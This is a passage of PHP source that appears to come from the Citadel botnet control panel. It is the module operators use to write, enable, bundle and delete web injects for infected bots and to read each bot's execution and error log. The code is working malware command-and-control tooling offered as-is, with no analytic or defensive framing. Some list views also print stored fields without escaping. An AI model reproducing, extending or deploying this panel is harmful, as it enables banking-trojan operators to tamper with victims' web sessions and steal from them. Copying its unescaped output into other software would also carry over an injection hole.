			    (:uid IS NULL OR `i`.`uid` = :uid)
			 GROUP BY `i`.`iid`
			 ORDER BY
			    `member_in_bundles` DESC,
			    `i`.`mtime` DESC
			 ;', array(
			':uid' => $group->perms == 'adm' ? null : $this->uid,
			':gid' => $gid,
		));

		# Display the list of injects
		echo '<table id="injects" class="zebra lined ', $group->perms == 'adm'?'adminnable':'', '">';
		echo '<caption>',
				LNG_INJECTS,
				($group->perms != 'r') ? '<a href="?m=botnet_webinjects/injectEdit&gid='.$group->gid.'&iid=0" id="add-new-inject">'.LNG_INJECT_ADD_INJECT.'</a>' : '',
				'</caption>';
		echo '<THEAD><tr>',
			'<th>', LNG_INJECT_TH_NAME, '</th>',
			'<th>', LNG_INJECT_TH_STATE, '</th>',
			'<th>', LNG_INJECT_TH_DESCR, '</th>',
			'<th>', LNG_INJECT_TH_AUTHOR, '</th>',
			'<th>', LNG_INJECT_TH_MODIFIED, '</th>',
			'<th>', LNG_INJECT_TH_MEMBER_IN_BUNDLES, '</th>',
			'</tr></THEAD>';
		echo '<TBODY>';
		while ($inject = $injects->fetchObject()){
			echo '<tr ',
				' data-ajax-delete="?m=botnet_webinjects/injectEdit&gid=', $group->gid, '&iid=', $inject->iid, '&remove=1" ',
				' >';
			echo '<th><a href="?m=botnet_webinjects/injectEdit&gid=', $group->gid, '&iid=', $inject->iid, '">', $inject->name, '</a></th>';
			echo '<td>', $inject->state=='on'? '' : '<b>', $inject->state, '</td>';
			echo '<td>', $inject->descr, '</td>';
			echo '<td>', $inject->author_name, '</td>';
			echo '<td>', date('Y-m-d H:i', $inject->mtime), '</td>';
			echo '<td>', $inject->member_in_bundles_count, '</td>';
			echo '</tr>';
		}
		echo '</TBODY>';
		echo '</table>';

		# Context menu hint
		if ($group->perms == 'adm')
			echo LNG_HINT_CONTEXT_MENU;

		ThemeEnd();
	}

	/** Edit inject
	 * @param int $gid Group ID you work in
	 * @param int $iid Inject ID | 0 to create a new one
	 * @param array $inject The posted form
	 * @param bool $remove Remove action flag
	 * @throws AccessDeniedActionException
	 * @throws NotFoundActionException
	 */
	function actionInjectEdit($gid, $iid = 0, $inject = array(), $remove = false){
		$group = $this->_loadGroup($gid, empty($iid)? null : $iid);

		# Permissions check
		if (empty($iid) && $group->perms == 'r')
			throw new AccessDeniedActionException('You don\'t have enough permissions for the group');

		# Handle 'remove'
		if (!empty($remove)){
			$this->db->query('DELETE FROM `botnet_webinjects` WHERE `iid`=:iid', array(':iid' => $iid));
			$this->db->query('DELETE FROM `botnet_webinjects_bundle_members` WHERE `iid`=:iid', array(':iid' => $iid));

			# Update the bundle
			$this->_updateBundle(null, $iid);
			return;
		}

		# Handle 'save'
		if (!empty($inject)){
			if (!strlen(trim($inject['name'])))
				$inject['name'] = date('d.m.Y H:i:s');

			# Store the inject
			$set_fields = '
				`mtime`=:now,
				`state`=:state,
				`name`=:name, `descr`=:descr,
				`inject`=:inject
				';
			$this->db->query(
				'INSERT INTO `botnet_webinjects`
				 SET
				    `iid`=:iid, `gid`=:gid, `uid`=:uid,
				    '.$set_fields.'
				 ON DUPLICATE KEY UPDATE
				    '.$set_fields.'
				 ;', array(
				':iid' => empty($iid)? null : $iid,
				':gid' => $gid,
				':uid' => $this->uid,
				':now' => time(),
				':state' => $inject['state'],
				':name' => $inject['name'],
				':descr' => $inject['descr'],
				':inject' => $inject['inject'],
			));
			if (empty($inject['iid']))
				$iid = $inject['iid'] = $this->db->lastInsertId();
			else
				$iid = $inject['iid'];

			# Update the bundle
			$this->_updateBundle(null, $iid);

			# Redirect
			header('Location: ?'.mkuri('1', 'm', 'gid').'&iid='.$inject['iid']);
			return;
		}

		# Load the design
		$grouplink = ' :: <a href="?m=botnet_webinjects/injects&'.mkuri(1, 'gid').'">'.htmlentities($group->name).'</a>';
		ThemeBegin(LNG_MM_BOTNET_WEBINJECTS.$grouplink, 0, getBotJsMenu('botmenu'), 0);
		echo $this->_assets();

		# Fetch the data
		if ($iid == 0)
			$inject = (object)array('state' => 'off', 'name' => '', 'descr' => '', 'inject' => '');
		else {
			$inject = $this->db->query(
				'SELECT *
				 FROM `botnet_webinjects`
				 WHERE `gid`=:gid AND `iid`=:iid
				 ;', array(
				':iid' => $iid,
				':gid' => $group->gid
			))->fetchObject();
			if (!$inject)
				throw new NotFoundActionException('Inject not found');
		}

		# Display the form
		echo '<form action="?', mkuri(1, 'm', 'iid', 'gid'), '" method="POST" id="inject-edit" class="w100" >',
			'<dl>',
				'<dt>', LNG_INJECT_EDIT_INJECT_NAME, '</dt>',
					'<dd>', '<input type="text" name="inject[name]" />', '</dd>',
				'<dt>', LNG_INJECT_EDIT_INJECT_DESCR, '</dt>',
					'<dd>', '<textarea rows="5" cols="60" name="inject[descr]"></textarea>', '</dd>',
				'<dt>', LNG_INJECT_EDIT_INJECT_STATE, '</dt>',
					'<dd>', '<input type="hidden" name="inject[state]" value="off"><label><input type="checkbox" name="inject[state]" value="on"> ', LNG_INJECT_EDIT_INJECT_STATE_ENABLED, '</label>', '</dd>',
				'<dt>', LNG_INJECT_EDIT_INJECT_CODE, '</dt>',
					'<dd>', '<textarea rows="30" cols="60" name="inject[inject]" id="inject-edit-code"></textarea>', '</dd>',
				'</dl>',
			'<input type="submit" value="', LNG_GROUP_EDIT_GROUP_SAVE, '" />',
			'</form>';
		echo js_form_feeder('form#inject-edit', array(
			'inject[name]'           => $inject->name,
			'inject[descr]'          => $inject->descr,
			'inject[state]'          => $inject->state,
			'inject[inject]'         => $inject->inject,
		));

		echo <<<HTML
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/lib/codemirror.js"></script>
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/lib/util/foldcode.js"></script>
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/lib/util/closetag.js"></script>
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/lib/util/overlay.js"></script>
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/lib/util/multiplex.js"></script>
		<link rel="stylesheet" type="text/css" href="theme/js/CodeMirror-2.3/lib/codemirror.css" media="all">
		<link rel="stylesheet" type="text/css" href="theme/js/CodeMirror-2.3/theme/neat.css" media="all">

		<script type="text/javascript" src="theme/js/CodeMirror-2.3/mode/xml/xml.js"></script>
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/mode/css/css.js"></script>
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/mode/javascript/javascript.js"></script>
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/mode/htmlmixed/htmlmixed.js"></script>
		<script type="text/javascript" src="theme/js/CodeMirror-2.3/mode/citadel-webinject/citadel-webinject.js"></script>

		<script>
		// Init CodeMirror
		$(function(){
			var editor = $('form#inject-edit textarea#inject-edit-code')[0];
			var cm_editor = CodeMirror.fromTextArea(editor, {
				theme: 'default neat',
				mode: 'citadel-webinject',
				lineWrapping: true,
				lineNumbers: true,
				gutter: true,

				onGutterClick: CodeMirror.newFoldFunction(CodeMirror.tagRangeFinder),
				extraKeys: { // closetag
					"'>'": function(cm) { cm.closeTag(cm, '>'); },
					"'/'": function(cm) { cm.closeTag(cm, '/'); }
				}
			});
		});
		</script>
		<style>
		.CodeMirror { background: #FFF; }
		</style>
HTML;

	ThemeEnd();
	}

	/** Execution logs list page
	 * @param int $page
	 */
	function actionExecLogs($page = 1){
		ThemeBegin(LNG_MM_BOTNET_WEBINJECTS, 0, getBotJsMenu('botmenu'), 0);

		$PAGER = new Paginator($page, 50);
		$q_logs = $this->db->prepare(
			'SELECT SQL_CALC_FOUND_ROWS
			    `b`.`bid`,
			    `b`.`name` AS `b_name`,
			    `b`.`mtime` AS `b_mtime`,
			    `h`.`botId`,
			    `h`.`etime`,
			    `h`.`exec_count`,
			    `h`.`exec_error`,
			    `h`.`debug_error`
			 FROM `botnet_webinjects_history` `h`
			    LEFT JOIN `botnet_webinjects_bundle` `b` USING(`bid`)
			 ORDER BY
			    `h`.`etime` IS NULL DESC,
			    `b`.`mtime` DESC,
			    `h`.`etime` DESC
			 LIMIT :limit, :perpage
			 ;');
		$PAGER->pdo_limit($q_logs, ':limit', ':perpage');
		$q_logs->execute();
		$PAGER->total($this->db->found_rows());

		echo '<table id="exec-logs" class="zebra lined">';
		echo '<THEAD>',
				'<tr>',
					'<th>', 'BotId', '</th>',
					'<th>', 'Bundle', '</th>',
					'<th>', 'State', '</th>',
					'<th>', 'Exec count', '</th>',
					'<th>', 'Exec time', '</th>',
					'<th>', 'Exec error', '</th>',
					'<th>', 'Debug error', '</th>',
					'</tr>',
				'</THEAD>';
		echo '<TBODY>';
		while ($log = $q_logs->fetchObject()){
			$state = ((int)is_null($log->etime)).((int)is_null($log->exec_error)).((int)is_null($log->debug_error));
			switch ($state){
				case '111': $state_text = 'pending' ; break;
				case '011': $state_text = 'success' ; break;
				case '001': $state_text = 'exec error' ; break;
				case '010': $state_text = 'bot error' ; break;
				default:
					$state_text = '???';
					break;
			}

			echo '<tr class="state'.$state.'">';
			echo '<th>', htmlentities($log->botId), '</th>';
			echo '<td>', htmlentities($log->b_name), '</td>';
			echo '<td>', $state_text, '</td>';
			# Exec count
			echo '<td>',
					is_null($log->exec_count)
							? '-' # never
							: $log->exec_count, # 1+ times
					'</td>';
			# Exec time
			echo '<td>',
					is_null($log->etime)
							? date('H:i:s d.m.Y', $log->b_mtime) # not yet
							: timeago(time() - $log->etime), # executed
					'</td>';
			# Exec error
			echo '<td>',
					is_null($log->exec_error)
							? ''
							: '<div class="exec_error">'.htmlentities($log->exec_error).'</div>',
					'</td>';
			# Debug error
			echo '<td>',
					is_null($log->debug_error)
							? ''
							: '<div class="debug_error">'.htmlentities($log->debug_error).'</div>',
					'</td>';
			echo '</tr>';
		}
		echo '</TBODY>';
		echo '</table>';

		echo $PAGER->jPager3k(mkuri(1, 'm').'&page=%page%', null, 'paginator');

		echo <<<HTML
		<script src="theme/js/jPager3k/jPager3k.js"></script>
		<link rel="stylesheet" href="theme/js/jPager3k/jPager3k.css">
		<link rel="stylesheet" href="theme/js/jPager3k/jPager3k-default.css">
HTML;

		ThemeEnd();
	}

    function widget_botinfo_WebInjectsList($botId){
        $db = dbPDO::singleton();
        $q_execs = $db->query(
            'SELECT
                  `b`.`name` AS `b_name`,
                  `h`.`etime`,
                  `h`.`exec_error`,
                  `h`.`debug_error`
             FROM `botnet_webinjects_history` `h`
                  LEFT JOIN `botnet_webinjects_bundle` `b` USING(`bid`)
             WHERE `h`.`botId` = :botId
             ;', array(
            ':botId' => $botId,
        ));

        if (!$q_execs->rowCount())
            return '<i>(no WebInjects info)</i>';

        $html = '';
        $html .= '<table class="zebra lined" align="center">';
        $html .= '<caption>'.LNG_BA_FULLINFO_WEBINJECTS_HISTORY.'</caption>';
        $html .= '<THEAD><tr>';
        $html .= '<th>'.LNG_BA_FULLINFO_WEBINJECTS_TH_BUNDLE.'</th>';
        $html .= '<th>'.LNG_BA_FULLINFO_WEBINJECTS_TH_LOADED.'</th>';
        $html .= '<th>'.LNG_BA_FULLINFO_WEBINJECTS_TH_ERRORS.'</th>';
        $html .= '</tr></THEAD>';
        $html .= '<TBODY>';
        while ($log = $q_execs->fetchObject()){
            $html .=  '<tr>';
            $html .=  '<th>'.$log->b_name.'</th>';
            $html .=  '<td>'.(is_null($log->etime)? LNG_BA_FULLINFO_WEBINJECTS_PENDING : timeago(time() - $log->etime)).'</td>';
            $html .=  '<td>'.htmlentities(nl2br($log->exec_error.' '.$log->debug_error)).'</td>';
            $html .=  '</tr>';
        }
        $html .=  '</TBODY>';
        $html .=  '</table>';

        return $html;
    }
}
